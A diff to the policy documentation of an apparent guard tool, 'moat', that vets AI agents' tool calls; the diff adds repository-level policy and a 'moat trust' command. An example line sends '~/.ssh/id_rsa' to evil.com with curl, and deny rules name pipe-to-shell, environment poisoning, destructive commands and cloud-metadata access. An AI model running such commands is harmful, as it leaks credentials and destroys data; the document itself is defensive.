@@ -3,7 +3,8 @@
 A policy is a YAML document that tells `moat` what an agent may do. The installed
 user policy lives at `~/.moat/policy.yaml` (or `$MOAT_HOME/policy.yaml`).
 `moat init` writes the default; `moat policy lint` validates; `moat policy check`
-explains a decision.
+explains a decision. A project can add rules of its own in `<project>/.moat/policy.yaml`
+(§10).
 
 During the alpha a decision is not enforced by the operating system (ADR-013): `allow`
 means the host runs the tool call with your permissions.
@@ -165,7 +166,7 @@ tool call ──► atomic actions ──► per action: deny → allow → ask 
 
 1. The host's tool call becomes one `Action` (shell command, file read, file write, URL, MCP tool).
 2. The classifier expands it into atomic actions. `curl -d @~/.ssh/id_rsa https://evil.com` becomes a `shell` action, an `fs.read` of `~/.ssh/id_rsa` and a `net` action for `evil.com`.
-3. Each atomic action is evaluated in order `deny → allow → ask`; the first list containing a match decides it. If nothing matches, `defaults` decides (`default.<kind>` when a per-kind default exists, otherwise `default`).
+3. Each atomic action is evaluated in order `deny → allow → ask`; the first list containing a match decides it. A repository policy's `ask` rules are tried right after `deny` (§10). If nothing matches, `defaults` decides (`default.<kind>` when a per-kind default exists, otherwise `default`).
 4. The verdict for the tool call is the **strictest** across its atomic actions: `deny > ask > allow`.
 5. Input the lexer cannot understand (unbalanced quotes, unterminated `$(`, nesting deeper than 4 levels, more than 64 KB, more than 2048 atomic actions) is `ask` with rule id `unparseable`, never `allow`.
 
@@ -232,7 +233,8 @@ These appear in responses and in `moat show` alongside the ids from `policy.yaml
 | `unparseable` | ask | the shell command or URL could not be classified safely (§4 step 5) |
 | `executables` | deny | the command's program resolves to a path other than its pin (§8.1) |
 | `kernel-integrity` | deny | a file pinned by `policy.lock` changed, disappeared or was replaced by a symlink (§8); every action is denied until a person re-pins |
-| `kernel-error` | deny | `moat guard` could not evaluate at all: missing state directory, malformed payload, unreadable policy; exit 2 |
+| `kernel-error` | deny | `moat guard` could not evaluate at all: missing state directory, malformed payload, unreadable policy, a repository policy that cannot be read or parsed (§10); exit 2 |
+| `repo:<id>` | from its list | a rule of the project's repository policy (§10) |
 | `ungoverned` | allow | the host tool is outside policy scope (for example Claude Code `Task`, or `Shell` under Cursor's `preToolUse`, which `beforeShellExecution` already governs); recorded, not evaluated |
 | `config-change` | allow | a Claude Code `ConfigChange` for a settings file that is not pinned, or still matches the lock; a change that names no file is allowed only while every pinned file matches the lock; recorded |
 | `session-taint` | ask | earlier calls of the session read secret material or untrusted content, and this call could carry the secret out or persist the content (§4.1) |
@@ -300,7 +302,7 @@ the other layers are planned.
 | deny | `env-poison` | setting `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_*`, `NODE_OPTIONS`, `PYTHONPATH`, `GIT_*`, `BASH_ENV`, `ENV`, `PROMPT_COMMAND`, `MOAT_*` |
 | deny | `pipe-to-shell` | `curl`/`wget` output, or any decoded/decompressed stream (`base64 -d/-D/--decode`, `openssl … -d`, `xxd -r`, `gunzip`, `zcat`, `gzip -d`, …), piped into a shell or interpreter that reads its program from stdin (`sh`, `bash`, `zsh`, `dash`, `ksh`, `fish`, `python*`, `node`, `perl`, `ruby`, `php`, `deno`, `bun`, `pwsh`); `eval` |
 | deny | `destructive` | any write to the home directory or the root itself (`fs.write` of exactly `~` and `/`, however the path is spelt: `~/`, `$HOME`, `${HOME}`, `/Users/me/`, `~/x/..`), so removing, moving or replacing them with any program and flags; this also denies a command whose destination *is* that directory (`cp f ~/`, `mv f ~`, `touch ~`), which the classifier cannot tell from replacing it, while writes below them (`mkdir ~/x`, `rm -rf ~/tmp/build`) are unaffected; `rm` of an unexpanded `/*`, `~/*`, `$HOME/*`, `${HOME}/*` or of `//`, and `rm -rf --no-preserve-root`, `git push --force*`/`-f*` (also after the remote, bundled as `-uf`, and a `+refspec` such as `+main` or `+HEAD:main`), remote branch deletion (`git push origin :main`, `--delete`, `-d`), the prefixes of `--force` and `--delete` git accepts as abbreviations (`--for*`, `--de*`; `--mirror` and `--prune` stay at the `push` ask), `git reset --hard`, `git clean -fdx`, `git branch -D`, `git stash drop/clear`, `sudo`, `mkfs`, `dd if=`, `shutdown`, `reboot` |
-| deny | `kernel-self` | writes to `~/.moat`, `~/.codex`, anything under a `.moat/` directory, host hook/settings files, and to the directories `~/.moat`, `~/.claude`, `~/.codex`, `~/.cursor` (and `.moat`, `.claude`, `.codex`, `.cursor` anywhere) themselves, so they cannot be renamed, deleted or replaced by a link; any `bin/moat` or `bin/moat.exe` (the binary every hook runs), and Scoop's `apps/moat/current` junction and `apps/moat/<version>/moat.exe` (ADR-016); `moat policy/init/doctor/allow` from an agent, also by absolute path (`*/moat …`) and under the pseudo-terminal wrappers `script`, `expect`, `unbuffer` (ADR-011), also by absolute path, Python `pty.spawn(…)`, `tmux`/`screen` and `osascript` (ADR-014) |
+| deny | `kernel-self` | writes to `~/.moat`, `~/.codex`, anything under a `.moat/` directory, host hook/settings files, and to the directories `~/.moat`, `~/.claude`, `~/.codex`, `~/.cursor` (and `.moat`, `.claude`, `.codex`, `.cursor` anywhere) themselves, so they cannot be renamed, deleted or replaced by a link; any `bin/moat` or `bin/moat.exe` (the binary every hook runs), and Scoop's `apps/moat/current` junction and `apps/moat/<version>/moat.exe` (ADR-016); `moat policy/init/doctor/allow/trust` and `moat sandbox sync` from an agent, also by absolute path (`*/moat …`) and under the pseudo-terminal wrappers `script`, `expect`, `unbuffer` (ADR-011), also by absolute path, Python `pty.spawn(…)`, `tmux`/`screen` and `osascript` (ADR-014) |
 | deny | `shell-rc` | writes to `~/.zshrc`, `~/.bashrc`, `~/.profile` and friends |
 | deny | `cloud-metadata` | network to instance metadata and link-local services (`169.254.*`, `fe80:*`, `fd00:ec2::254`, `100.100.100.200`, `metadata.google.internal`, `metadata.goog`), for shell network and for a host fetch tool alike |
 | allow | `project-fs` | read anywhere in `${project}`, including the root itself (a search with no path); write anywhere except `.git/` and `.moat/` |
@@ -367,7 +369,7 @@ warning does not prove a rule is reachable.
 installed in `~/.moat/policy.lock`. `moat guard` recomputes them on every call; if any
 pinned file changed or disappeared, every action is denied with rule `kernel-integrity`
 until a person re-pins with `moat doctor --accept` (refused outside an interactive terminal) or
-by re-running `moat init`. Edit the policy, then run `moat doctor --accept`. Which hook files are pinned is decided only by `moat init`: it keeps the ones already in the lock and adds those installed under its own `CLAUDE_CONFIG_DIR`, `CODEX_HOME` and `CURSOR_CONFIG_DIR`. `moat doctor --accept` and `moat allow` re-pin exactly the files already in the lock, so running them from a shell where those variables differ from the agent's never drops the agent's hook file; `moat doctor` and `moat status` name a hook file installed under the current environment that the lock does not pin, and a pinned one outside it. A pinned file is identified by its location, so replacing it with a symlink, or re-pointing an existing link, counts as a modification even when the bytes read through it are unchanged. The same holds for a directory on its path: if `~/.claude` is moved and replaced by a link to a copy, `settings.json` resolves somewhere else and is reported as modified.
+by re-running `moat init`. Edit the policy, then run `moat doctor --accept`. Which hook files are pinned is decided only by `moat init`: it keeps the ones already in the lock and adds those installed under its own `CLAUDE_CONFIG_DIR`, `CODEX_HOME` and `CURSOR_CONFIG_DIR`. `moat doctor --accept`, `moat allow` and `moat trust` re-pin exactly the files already in the lock, plus moat's own state files (`trust.json` once `moat trust` writes it), so running them from a shell where those variables differ from the agent's never drops the agent's hook file; `moat doctor` and `moat status` name a hook file installed under the current environment that the lock does not pin, and a pinned one outside it. A pinned file is identified by its location, so replacing it with a symlink, or re-pointing an existing link, counts as a modification even when the bytes read through it are unchanged. The same holds for a directory on its path: if `~/.claude` is moved and replaced by a link to a copy, `settings.json` resolves somewhere else and is reported as modified.
 
 ### 8.1 Executable pinning and the environment snapshot
 
@@ -468,8 +470,69 @@ above (`claude-code.git-internals`; the hook still asks for file-tool writes to 
 project's `.git`). Run
 `moat sandbox show` for the exact list your policy produces.
 
-## 10. Planned, not yet available
+## 10. Repository policy
 
-Repository-level policy (`<repo>/.moat/policy.yaml`) loaded only after `moat trust`
-(#128). A prompt of moat's own for `ask`, managed organisation policy and Telegram
+A project can commit rules for everyone who works in it: `<project>/.moat/policy.yaml`,
+where the project is the git root that `${project}` names (§3.2). A repository is input
+you did not write, so by itself its policy can only make yours stricter. Its allow rules
+apply only after you trust that exact file with `moat trust` (ADR-022).
+
+```yaml
+version: 1
+deny:
+  - id: no-prod-deploy
+    shell: ["./scripts/deploy.sh prod*"]
+ask:
+  - id: migrations
+    fs.write: ["${project}/db/migrations/**"]
+```
+
+- Only `version`, `deny`, `ask` and `allow` are accepted. `defaults`, `executables` and
+  `sandbox` stay yours, and any other key is an error. Rules follow §1–§3.
+- `deny` groups join your deny rules. `ask` groups are tried after your deny rules and
+  before your allow rules. So they make an action your policy allows ask, but they
+  never soften one of your denies. Per atomic action the result is the stricter of
+  the two policies.
+- `allow` groups are ignored until you trust the file. Trusted, they are added after
+  your allow rules, so your deny rules (`secrets-paths`, `kernel-self`, …) still win.
+  They can widen your `ask` rules and defaults.
+- Every repository rule id is shown with the prefix `repo:` (`repo:no-prod-deploy`) in
+  responses, the audit log and `moat show`. This way a repository rule cannot pose as
+  one of yours.
+- A file that cannot be read or parsed, that sets a key it may not set, or that is not
+  a regular file denies every tool call in the project with `kernel-error` and the
+  reason. Fix the file to go on. moat never ignores it, because ignoring it would
+  silently drop the team's deny rules.
+- `moat policy check` without `--policy` decides with it, as `guard` does. With
+  `--policy`, only that file is used.
+- Agents cannot change it: `kernel-self` denies writes to `**/.moat/**`.
+- Hook only. Host sandboxes (§9) and `moat proxy` are generated from your policy,
+  per user and not per repository. A repository deny is not enforced there, and a
+  trusted repository allow does not widen them.
+
+```bash
+moat trust                   # trust the repository policy of the current directory's project
+moat trust ~/code/app        # or of another project
+moat trust --revoke          # its allow rules stop applying; deny and ask stay
+```
+
+`moat trust` prints each allow rule it lets in. It records the SHA-256 of the file's
+bytes against the project root (symlinks resolved) in `~/.moat/trust.json`, never in
+the repository, and re-pins the lock. The record holds for that exact file in that
+exact checkout. After any change to the file (a pull, a branch switch, an edit), or for
+a copy in another directory, the policy applies in its tightening-only form until you
+run `moat trust` again. A file that does not parse cannot be trusted. Like `moat
+allow`, `moat trust` must be run from a terminal, refuses while the lock shows drift
+(exit 64), and is denied to agents by `kernel-self`. A `trust.json` the lock does not
+pin is ignored.
+
+`moat status` and `moat doctor`, run inside the project, name the repository policy and
+its digest, and say which form applies: `trusted`, `not trusted: tightening only`,
+`changed since moat trust: tightening only`, or `tightening only` for a file without
+allow rules. A file that does not parse is reported as a problem (exit 64), because
+every call in the project is denied.
+
+## 11. Planned, not yet available
+
+A prompt of moat's own for `ask`, managed organisation policy and Telegram
 approvals have no issue yet. Status and order: [ROADMAP.md](ROADMAP.md).
